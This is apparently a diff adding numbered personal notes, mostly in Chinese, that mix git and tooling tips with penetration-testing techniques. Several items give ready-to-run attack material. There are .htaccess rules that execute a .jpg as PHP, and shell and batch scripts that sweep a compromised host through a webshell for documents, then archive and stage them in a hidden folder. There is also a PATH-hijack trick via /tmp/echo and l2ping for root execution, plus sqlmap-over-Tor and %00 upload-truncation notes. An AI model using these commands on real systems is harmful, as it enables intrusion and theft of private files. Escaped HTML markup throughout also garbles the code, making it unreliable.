+  服务进程管理:phpstudy (start|stop|restart|uninstall)
+  站点主机管理:phpstudy (add|del|list)
+  ftpd用户管理:phpstudy ftp (add|del|list)
+&lt;span class=&quot;p&quot;&gt;33.&lt;/span&gt;strem:http://www.yxbao.com/bd/27803.html#goDown
+&lt;span class=&quot;p&quot;&gt;34.&lt;/span&gt;linux的git使用:
+  http://www.linuxidc.com/Linux/2014-02/96989.htm
+  完成密钥的设置后:
+  git init
+  git add .
+  git commit -a -m &quot;xxx&quot;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;没有这一步会显示error&amp;gt;
+  git remote add origin url
+  git push -u origin master
+
+  更新部分文件时,提交更新:
+  git add file(changed file or new file,the command &#39;git add&#39; means add file to local git repositories)
+  git status(check is the file status is ok)
+  git commit -a -m &quot;something&quot;(without commit command can not update the file,this is a &#39;must&#39;)
+  git push -u origin master&lt;span class=&quot;sb&quot;&gt;
+
+
+&lt;/span&gt;  新建本地git仓库时,添加文件:(要先pull下来tar_url的文件到新建的文件夹,然后将要提交的文件复制到新建文件夹中,
+  如果先把要提交的新文件放到新建的文件夹下再进行如下一串命令,将提示出错)
+  git init(在随便新建的一个文件夹下)
+  git pull tar_url(该条命令执行后用新文件替换旧文件)
+  git status
+  git add newfile (git add .)
+  git commit -a -m &quot;xxx&quot;
+  git remote add origin tar_url
+  git push -u origin master                                               
+&lt;span class=&quot;p&quot;&gt;
+35.&lt;/span&gt;生活学习:1&amp;gt;(本杰明-富兰克林13条)http://www.201980.com/lizhi/chenggong/9386.html
+             2&amp;gt;(曾国藩修身12条)http://www.201980.com/lizhi/chenggong/8007.html
+&lt;span class=&quot;p&quot;&gt;36.&lt;/span&gt;mouse without borders:多屏幕同键盘鼠标控制
+              https://www.microsoft.com/en-us/download/confirmation.aspx?id=35460(win)
+              http://alternativeto.net/software/mouse-without-borders2/?platform=linux(linux)
+              x2vnc(目前认为最好,通过vnc达到mouse without borders的功能!!)
+&lt;span class=&quot;p&quot;&gt;37.&lt;/span&gt;java执行jar文件命令:java -jar xx.jar
+&lt;span class=&quot;p&quot;&gt;38.&lt;/span&gt;.htaccess can be :
+  1&amp;gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;FilesMatch&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;haha&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+  SetHandler application/x-httpd-php
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/FilesMatch&amp;gt;&lt;/span&gt;
+  2&amp;gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;Files&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;demo&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;jpg&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+  ForceType application/x-httpd-php
+  SetHandler application/x-httpd-php
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/Files&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;39.&lt;/span&gt;临时的一种暴路径思路:netsparker扫出有输入的php页面及输入变量名,然后用awvs里面的fuzz功能fuzz,得到暴错的路径,可试.
+&lt;span class=&quot;p&quot;&gt;40.&lt;/span&gt;(command1 &amp;amp; command2)==(command1;command2)    
+   command1 &amp;amp;&amp;amp; command2中,如果command1不成功,command2则不会执行,(command1 &amp;amp; command2)或(command1;command2)中如果command1不成功,command1会执行
+   locate &lt;span class=&quot;ge&quot;&gt;*.doc &amp;gt; doc.list &amp;amp;&amp;amp; locate *&lt;/span&gt;.docx &amp;gt; docx.list &amp;amp;&amp;amp; locate &lt;span class=&quot;ge&quot;&gt;*.pdf &amp;gt; pdf.list &amp;amp;&amp;amp; locate *&lt;/span&gt;.txt &amp;gt; txt.list &amp;amp;&amp;amp; locate &lt;span class=&quot;ge&quot;&gt;*.xls &amp;gt; xls.list &amp;amp;&amp;amp; locate *&lt;/span&gt;.xlsx &amp;gt; xlsx.list &amp;amp;&amp;amp; locate &lt;span class=&quot;ge&quot;&gt;*.jpg &amp;gt; jpg.list &amp;amp;&amp;amp; locate *&lt;/span&gt;.png &amp;gt; png.list
+   tar -czf code.tar.gz &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &amp;amp;&amp;amp; tar -T doc.list -czf doc.tar.gz &amp;amp;&amp;amp; tar -T docx.list -czf docx.tar.gz &amp;amp;&amp;amp; tar -T pdf.list -czf pdf.tar.gz &amp;amp;&amp;amp; tar -T txt.list -czf txt.tar.gz &amp;amp;&amp;amp; tar -T xls.list -czf xls.tar.gz &amp;amp;&amp;amp; tar -T xlsx.list -czf xlsx.tar.gz &amp;amp;&amp;amp; tar -T jpg.list -czf jpg.tar.gz &amp;amp;&amp;amp; tar -T png.list -czf png.tar.gz
+   
+   or when there exist the same ip but different site:
+
+   find -regex &quot;.&lt;span class=&quot;ge&quot;&gt;*\.\(doc\|docx\)&quot; &amp;gt; doc.list &amp;amp;&amp;amp; find -regex &quot;.*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;pdf&quot; &amp;gt; pdf.list &amp;amp;&amp;amp; find -regex &quot;.&lt;span class=&quot;ge&quot;&gt;*\.txt&quot; &amp;gt; txt.list &amp;amp;&amp;amp; find -regex &quot;.*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.\(&lt;/span&gt;xls&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;xlsx&lt;span class=&quot;se&quot;&gt;\)&lt;/span&gt;&quot; &amp;gt; xls.list &amp;amp;&amp;amp; find -regex &quot;.&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.\(&lt;/span&gt;jpg&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;png&lt;span class=&quot;se&quot;&gt;\)&lt;/span&gt;&quot; &amp;gt; jpg.list    
+   ///find . -regex &quot;xxx&quot;   (.)  .  can be used or not while they both mean find the current path
+   ///sometimes the system may not support &amp;amp;&amp;amp; to execute &quot;find&quot;,then we should execute above find command without &quot;&amp;amp;&amp;amp;&quot; and find them one by one
+   ///or maybe sometimes the system may not support -regex in find command
+   ///or maybe sometimes the system may not support without path command with find,use . or ./ better any time find the current path 
+   then the better answer:
+   find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.doc&quot; &amp;gt; doc.list &amp;amp;&amp;amp; find . -name &quot;*&lt;/span&gt;.docx&quot; &amp;gt; docx.list &amp;amp;&amp;amp; find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.pdf&quot; &amp;gt; pdf.list &amp;amp;&amp;amp; find . -name &quot;*&lt;/span&gt;.txt&quot; &amp;gt; txt.list &amp;amp;&amp;amp; find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.xls&quot; &amp;gt; xls.list &amp;amp;&amp;amp; find . -name &quot;*&lt;/span&gt;.xlsx&quot; &amp;gt; xlsx.list &amp;amp;&amp;amp; find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.jpg&quot; &amp;gt; jpg.list &amp;amp;&amp;amp; find . -name &quot;*&lt;/span&gt;.png&quot; &amp;gt; png.list
+   tar -czf code.tar.gz &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &amp;amp;&amp;amp; tar -T doc.list -czf doc.tar.gz &amp;amp;&amp;amp; tar -T docx.list -czf docx.tar.gz &amp;amp;&amp;amp; tar -T pdf.list -czf pdf.tar.gz &amp;amp;&amp;amp; tar -T txt.list -czf txt.tar.gz &amp;amp;&amp;amp; tar -T xls.list -czf xls.tar.gz &amp;amp;&amp;amp; tar -T xlsx.list -czf xlsx.tar.gz &amp;amp;&amp;amp; tar -T jpg.list -czf jpg.tar.gz &amp;amp;&amp;amp; tar -T png.list -czf png.tar.gz
+   ///however,i found that &quot;&amp;amp;&amp;amp;&quot; or &quot;||&quot; are both not the best,coz command &quot;a &amp;amp;&amp;amp; b&quot; means only command &quot;a&quot; execute successly,then &quot;b&quot; can execute
+   ///comman &quot;a || b&quot; means if &quot;a&quot; execute successly,then &quot;b&quot; will not execute
+   ///but comman &quot;a;b&quot; means &quot;a&quot; and &quot;b&quot; will both execute,no mater the former &quot;a&quot; execute successfully or not 
+   so,the better and beeter combine command is:
+   find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.doc&quot; &amp;gt; doc.list;find . -name &quot;*&lt;/span&gt;.docx&quot; &amp;gt; docx.list;find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.pdf&quot; &amp;gt; pdf.list;find . -name &quot;*&lt;/span&gt;.txt&quot; &amp;gt; txt.list;find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.xls&quot; &amp;gt; xls.list;find . -name &quot;*&lt;/span&gt;.xlsx&quot; &amp;gt; xlsx.list;find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.jpg&quot; &amp;gt; jpg.list;find . -name &quot;*&lt;/span&gt;.png&quot; &amp;gt; png.list
+   tar -czf code.tar.gz &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;;tar -T doc.list -czf doc.tar.gz;tar -T docx.list -czf docx.tar.gz;tar -T pdf.list -czf pdf.tar.gz;tar -T txt.list -czf txt.tar.gz;tar -T xls.list -czf xls.tar.gz;tar -T xlsx.list -czf xlsx.tar.gz;tar -T jpg.list -czf jpg.tar.gz;tar -T png.list -czf png.tar.gz
+
+   recently I found command1;command2 performs not good to search all files in webshell&#39;s upon commonds,better to execute comman1 &amp;amp;&amp;amp; command2 if comman1 and command2 cost not few seconds,but a lot seconds to finish executing:
+
+   find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.doc&quot; &amp;gt; doc.list &amp;amp;&amp;amp; find . -name &quot;*&lt;/span&gt;.docx&quot; &amp;gt; docx.list &amp;amp;&amp;amp; find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.pdf&quot; &amp;gt; pdf.list &amp;amp;&amp;amp; find . -name &quot;*&lt;/span&gt;.txt&quot; &amp;gt; txt.list &amp;amp;&amp;amp; find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.xls&quot; &amp;gt; xls.list &amp;amp;&amp;amp; find . -name &quot;*&lt;/span&gt;.xlsx&quot; &amp;gt; xlsx.list
+   tar -T doc.list -czf doc.tar.gz &amp;amp;&amp;amp; tar -T docx.list -czf docx.tar.gz &amp;amp;&amp;amp; tar -T pdf.list -czf pdf.tar.gz &amp;amp;&amp;amp; tar -T txt.list -czf txt.tar.gz &amp;amp;&amp;amp; tar -T xls.list -czf xls.tar.gz &amp;amp;&amp;amp; tar -T xlsx.list -czf xlsx.tar.gz
+
+   or:
+   mkdir /tmp/tmp
+   PATH=/tmp:$PATH;export PATH;echo $PATH;/bin/echo &#39;&#39;&#39;find / -name &quot;&lt;span class=&quot;ge&quot;&gt;*.doc&quot; &amp;gt; /tmp/tmp/doc.list &amp;amp;&amp;amp; find / -name &quot;*&lt;/span&gt;.docx&quot; &amp;gt; /tmp/tmp/docx.list &amp;amp;&amp;amp; find / -name &quot;&lt;span class=&quot;ge&quot;&gt;*.pdf&quot; &amp;gt; /tmp/tmp/pdf.list &amp;amp;&amp;amp; find / -name &quot;*&lt;/span&gt;.txt&quot; &amp;gt; /tmp/tmp/txt.list &amp;amp;&amp;amp; find / -name &quot;&lt;span class=&quot;ge&quot;&gt;*.xls&quot; &amp;gt; /tmp/tmp/xls.list &amp;amp;&amp;amp; find / -name &quot;*&lt;/span&gt;.xlsx&quot; &amp;gt; /tmp/tmp/xlsx.list&#39;&#39;&#39; &amp;gt; /tmp/.out;rm /tmp/echo;ln -s /tmp/.out /tmp/echo;chmod +x /tmp/.out;/bin/l2ping &amp;gt; /tmp/.out1;cat /tmp/.out1;rm /tmp/.out1
+   tar -T /tmp/tmp/doc.list -czf /tmp/tmp/doc.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/docx.list -czf /tmp/tmp/docx.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/pdf.list -czf /tmp/tmp/pdf.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/txt.list -czf /tmp/tmp/txt.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/xls.list -czf /tmp/tmp/xls.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/xlsx.list -czf /tmp/tmp/xlsx.tar.gz
+
+   sometimes when try to execute in this way:
+   PATH=/tmp:$PATH;export PATH;echo $PATH;/bin/echo &#39;&#39;&#39;find / -name &quot;&lt;span class=&quot;ge&quot;&gt;*.doc&quot; &amp;gt; /tmp/tmp/doc.list &amp;amp;&amp;amp; find / -name &quot;*&lt;/span&gt;.docx&quot; &amp;gt; /tmp/tmp/docx.list &amp;amp;&amp;amp; find / -name &quot;&lt;span class=&quot;ge&quot;&gt;*.pdf&quot; &amp;gt; /tmp/tmp/pdf.list &amp;amp;&amp;amp; find / -name &quot;*&lt;/span&gt;.txt&quot; &amp;gt; /tmp/tmp/txt.list &amp;amp;&amp;amp; find / -name &quot;&lt;span class=&quot;ge&quot;&gt;*.xls&quot; &amp;gt; /tmp/tmp/xls.list &amp;amp;&amp;amp; find / -name &quot;*&lt;/span&gt;.xlsx&quot; &amp;gt; /tmp/tmp/xlsx.list&#39;&#39;&#39; &amp;gt; /tmp/.out;rm /tmp/echo;ln -s /tmp/.out /tmp/echo;chmod +x /tmp/.out;/bin/l2ping &amp;gt; /tmp/.out1;cat /tmp/.out1;rm /tmp/.out1
+
+   may found it didn&#39;t succeed to create list file except for doc.list,then try useing normal webshell&#39;s terminal to execute the one without root privilege in one of upon ways&lt;span class=&quot;sb&quot;&gt;
+
+
+&lt;/span&gt;   windows:
+   find /r 目录名 %变量名 in (匹配模式1,匹配模式2) do 命令  eg:echo &quot;yes&quot; | for /r f:&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;%i in (&lt;span class=&quot;ge&quot;&gt;*.doc,*&lt;/span&gt;.docx,&lt;span class=&quot;ge&quot;&gt;*.pdf,*&lt;/span&gt;.xls,&lt;span class=&quot;ge&quot;&gt;*.xlsx,*&lt;/span&gt;.txt) do copy &quot;%i&quot; f:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;eb_r
+   c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ar.exe a -k -r -s -m1 c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp.rar c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;
+   7z.exe a -t7z -p123456 c:&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;est.7z c:&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;est&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;
+   del /f/q folder
+   rar a /v20m /m0 newfilename web.rar
+   windows find web.config==&amp;gt;for /r c:&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;ttp&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;%i in (web.conf?g) do (echo &lt;span class=&quot;gs&quot;&gt;****&lt;/span&gt;&lt;span class=&quot;ge&quot;&gt;*filepath*&lt;/span&gt;&lt;span class=&quot;gs&quot;&gt;****&lt;/span&gt; &amp;gt;&amp;gt; tmp.txt &amp;amp;&amp;amp; echo %i &amp;gt;&amp;gt; tmp.txt &amp;amp;&amp;amp; type &quot;%i&quot; &amp;gt;&amp;gt; tmp.txt &amp;gt;&amp;gt; tmp.txt &amp;amp;&amp;amp; echo. &amp;gt;&amp;gt; tmp.txt)
+   windows bat批处理for用法:http://blog.csdn.net/wh_19910525/article/details/7912440&lt;span class=&quot;sb&quot;&gt;
+
+
+&lt;/span&gt;   windows找文件命令:
+   for /f %j in (&#39;dir /b /s &quot;c:&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;SCOMCTL.O?X&quot;&#39;) do (echo %j)
+    windows找文件中的字符串命令:
+   findstr /R &quot;.&lt;span class=&quot;ge&quot;&gt;*sa.*&lt;/span&gt;&quot; c:&lt;span class=&quot;se&quot;&gt;\1\*&lt;/span&gt; &amp;gt; tmp.txt
+
+   powershell:dir –r | select-string &quot;root&quot;
+
+   windows打包(7z)命令:1.bat
+   ---------------content of 1.bat--------------------------
+    @echo off
+    goto :main
+    这是注释:(for /f &quot;delims=&quot;的作用为取消默认的以空格等符号作为分割符
+    dir /s 实现了linux中的find功能,for /r path %%i in (web.conf?g) do ... 也可以实现find功能,但是自己实现时发现for /r path ...中的path只能是一个具体路径,不能是变量,这样就不能遍历全部磁盘了)
+    :main
+    set str=c d e f g h i j k l m n o p q r s t u v w x y z 
+    rd /s/q c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
+    md c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
+    echo  当前硬盘的分区有: 
+    for %%i in (%str%) do (
+    if exist %%i: (echo %%i:
+    
+    for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.doc&quot;&#39;) do (
+    echo &quot;yes&quot; | copy &quot;%%j&quot; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
+    echo %%j &amp;gt;&amp;gt; tmp.txt
+    )
+    
+    for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.docx&quot;&#39;) do (
+    echo &quot;yes&quot; | copy &quot;%%j&quot; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
+    echo %%j &amp;gt;&amp;gt; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp.txt
+    )
+    
+    
+    for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.pdf&quot;&#39;) do (
+    echo &quot;yes&quot; | copy &quot;%%j&quot; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
+    echo %%j &amp;gt;&amp;gt; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp.txt
+    )
+    
+    
+    for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.txt&quot;&#39;) do (
+    echo &quot;yes&quot; | copy &quot;%%j&quot; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
+    echo %%j &amp;gt;&amp;gt; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp.txt
+    )
+    
+    
+    for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.xls&quot;&#39;) do (
+    echo &quot;yes&quot; | copy &quot;%%j&quot; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
+    echo %%j &amp;gt;&amp;gt; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp.txt
+    )
+    
+    
+    for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.xlsx&quot;&#39;) do (
+    echo &quot;yes&quot; | copy &quot;%%j&quot; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
+    echo %%j &amp;gt;&amp;gt; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp.txt
+    )
+    
+    
+    )
+    )
+    
+    7z a -t7z C:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;est.7z C:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;
+    ------------------end--------------------------------&lt;span class=&quot;sb&quot;&gt;
+
+    linux打包命令:1.sh(attention:without &quot;&amp;amp;&amp;amp; echo ok&quot;,the final tar -T xlsx.list -czf xlsx.tar.gz will fail)
+    -----------------content of 1.sh--------------------
+    mkdir /tmp/tmp &amp;amp;&amp;amp; find / -name &quot;*.doc&quot; &amp;gt; /tmp/tmp/doc.list &amp;amp;&amp;amp; find / -name &quot;*.docx&quot; &amp;gt; /tmp/tmp/docx.list &amp;amp;&amp;amp; find / -name &quot;*.pdf&quot; &amp;gt; /tmp/tmp/pdf.list &amp;amp;&amp;amp; find / -name &quot;*.txt&quot; &amp;gt; /tmp/tmp/txt.list &amp;amp;&amp;amp; find / -name &quot;*.xls&quot; &amp;gt; /tmp/tmp/xls.list &amp;amp;&amp;amp; find / -name &quot;*.xlsx&quot; &amp;gt; /tmp/tmp/xlsx.list &amp;amp;&amp;amp; tar -T /tmp/tmp/doc.list -czf /tmp/tmp/doc.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/docx.list -czf /tmp/tmp/docx.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/pdf.list -czf /tmp/tmp/pdf.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/txt.list -czf /tmp/tmp/txt.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/xls.list -czf /tmp/tmp/xls.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/xlsx.list -czf /tmp/tmp/xlsx.tar.gz &amp;amp;&amp;amp; echo ok
+    --------------------end-----------------------------
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;41.&lt;/span&gt;kali linux2.0 import folder path:/usr/share/applications   eg.gnome-control-center network
+&lt;span class=&quot;p&quot;&gt;42.&lt;/span&gt;http://www.orico.com.cn/   driver    
+&lt;span class=&quot;p&quot;&gt;43.&lt;/span&gt;python中单引号,双引号,三引号http://blog.csdn.net/caianye/article/details/6638183       
+&lt;span class=&quot;p&quot;&gt;45.&lt;/span&gt;os.system(&#39;&#39;&#39;python %s &amp;gt;&amp;gt; &quot;out_log.txt&quot;&#39;&#39;&#39; % exp_path) &quot;&amp;gt;&amp;gt;&quot; instead of &quot;open(file,&quot;a+&quot;) fp.write(str)&quot; in py2 or py3
+&lt;span class=&quot;p&quot;&gt;46.&lt;/span&gt;tips:  
+   msf必不可少burpsuite/fiddler必不可少python,ruby,shell,perl必不可少,不会编程还是别玩了.
+   c/c++/java能看懂写小东西,这几个得熟练nmap,sqlmap,niktoida常备dropbox,evernote常备还有啥呢?
+   成形的工具只能用于通用检测,针对具体对象,还需要写些自己的工具,另外准备些有针对性的基础库,字典啥的,经常干这个都知道先想到这些,稍后再补充,再紧张干活中…….
+&lt;span class=&quot;p&quot;&gt;47.&lt;/span&gt;google-chrome-stable on kali linux2.0
+   adding --user-data-dir
+   and open terminal : /usr/bin/google-chrome-stable %U --no-sandbox  or cd /usr/share/applications edit Google Chrome by right mouse,add     %U --no-sandbox
+&lt;span class=&quot;p&quot;&gt;48.&lt;/span&gt;sqlmap with tor:http://navisec.it/%E5%9C%A8%E4%BB%A3%E7%90%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E4%BD%BF%E7%94%A8sqlmap/
+   sqlmap --tor --tor-type=socks5 &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;--tor-port=9050&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; --check-tor
+   sqlmap --proxy=socks5://127.0.0.1:9050
+   sqlmap --proxy=socks5://127.0.0.1:9050 --proxy-cred=admin:pass
+&lt;span class=&quot;p&quot;&gt;49.&lt;/span&gt;tor的笔记:
+   1&amp;gt;apt-get install tor安装的tor默认端口是9050,开机自启动tor:vim /etc/rc.local,在exit 0前加上service tor start,和proxychains搭配使用时设置proxychains.conf里面的端口为9050
+   2&amp;gt;Tor-Browser洋葱浏览器自带tor,每次启动tor-browser时,它会启动它自带的tor,该tor默认端口是9150(老版本的是9050)
+   3&amp;gt;1中的tor和2中的tor功能完全一样,proxychains firefox等程序时对应的proxychains.conf里面的端口为9050,启动tor-browser浏览器后可用也可将proxychains.conf中端口改为9150,但tor-browser关闭后proxychains这样的代理设置会失效.
+&lt;span class=&quot;p&quot;&gt;50.&lt;/span&gt;Python Unicode与中文处理:http://my.oschina.net/u/201886/blog/64692
+&lt;span class=&quot;p&quot;&gt;51.&lt;/span&gt;shadow copy神器,可以复制使用中的文件,可拷贝数据库
+&lt;span class=&quot;p&quot;&gt;52.&lt;/span&gt;php中的header()函数 http://www.cnblogs.com/fengzheng126/archive/2012/04/21/2461475.html
+&lt;span class=&quot;p&quot;&gt;53.&lt;/span&gt;php中{}的功能 http://zhidao.baidu.com/link?url=KTLBf6o36tO9J0elyLbbVpdL9F-uD_Js4X2hwQq5EzinT2L3ba_Xq-esopPYkTiszNpXR2HposrabwqCx3VXRq
+&lt;span class=&quot;p&quot;&gt;54.&lt;/span&gt;php上传中%00截断的理解:
+   python脚本中:
+   def hex_to_asc(ch):
+       return &#39;{:c}&#39;.format(int(float.fromhex(ch)))
+
+   for i in range(100):
+       s = &#39;%02d&#39; % i
+       print &quot;s:%s,hex_to_asc(s):%s&quot; % (s,hex_to_asc(s))
+   可以得到如下结果:
+   s:00,hex_to_asc(s):NULL
+   s:01,hex_to_asc(s):
+   s:02,hex_to_asc(s):
+   ...
+   s:29,hex_to_asc(s):)
+   s:30,hex_to_asc(s):0
+   s:31,hex_to_asc(s):1
+   s:32,hex_to_asc(s):2
+   s:33,hex_to_asc(s):3
+   s:34,hex_to_asc(s):4
+   s:35,hex_to_asc(s):5
+   s:36,hex_to_asc(s):6
+   s:37,hex_to_asc(s):7
+   s:38,hex_to_asc(s):8
+   s:39,hex_to_asc(s):9
+   s:40,hex_to_asc(s):@
+   s:41,hex_to_asc(s):A
+   s:42,hex_to_asc(s):B
+   s:43,hex_to_asc(s):C
+   s:44,hex_to_asc(s):D
+   s:45,hex_to_asc(s):E
+   s:46,hex_to_asc(s):F
+   s:47,hex_to_asc(s):G
+   s:48,hex_to_asc(s):H
+   s:49,hex_to_asc(s):I
+   s:50,hex_to_asc(s):P
+   s:51,hex_to_asc(s):Q
+   s:52,hex_to_asc(s):R
+   s:53,hex_to_asc(s):S
+   s:54,hex_to_asc(s):T
+   s:55,hex_to_asc(s):U
+   s:56,hex_to_asc(s):V
+   s:57,hex_to_asc(s):W
+   s:58,hex_to_asc(s):X
+   s:59,hex_to_asc(s):Y
+   s:60,hex_to_asc(s):&lt;span class=&quot;err&quot;&gt;`&lt;/span&gt;
+   s:61,hex_to_asc(s):a
+   s:62,hex_to_asc(s):b
+   ascii码对照表中情况:
+   标准I表:
+   bin          dec          hex          缩写/字符                 解释
+   0000 0000    0            00           NUL(null)                空字符
+   0000 0001    1            01           SOH(start of headline)   标题开始
+   ...
+   0010 0000    32           20           (space)                  空格
+   00110000     48           30           0
+   01000001     65           41           A
+   01100001     97           61           a
+   在计算机中,所有的数据在存储和运算时都要使用二进制数表示(因为计算机用高电平和低电平分别表示1和0),例如,像a、b、c、d这样的52个字母(包括大写)、以及0、1等数字还有一些常用的符号(例如&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;、#、@等)在计算机中存储时也要使用二进制数来表示,而具体用哪些二进制数字表示哪个符号,当然每个人都可以约定自己的一套(这就叫编码),而大家如果要想互相通信而不造成混乱,那么大家就必须使用相同的编码规则,于是美国有关的标准化组织就出台了ASCII编码,统一规定了上述常用符号用哪些二进制数来表示.
+   个人理解成ascii码只是一个对照关系,如果硬说ascii是多少,则把ascii码值当作&quot;缩写/字符&quot;一栏对应的值,
+   即二进制(01000001)对应二进制(65)对应十六进制(41),而它们对应的ascii码为键盘上的可控字符&quot;A&quot;,
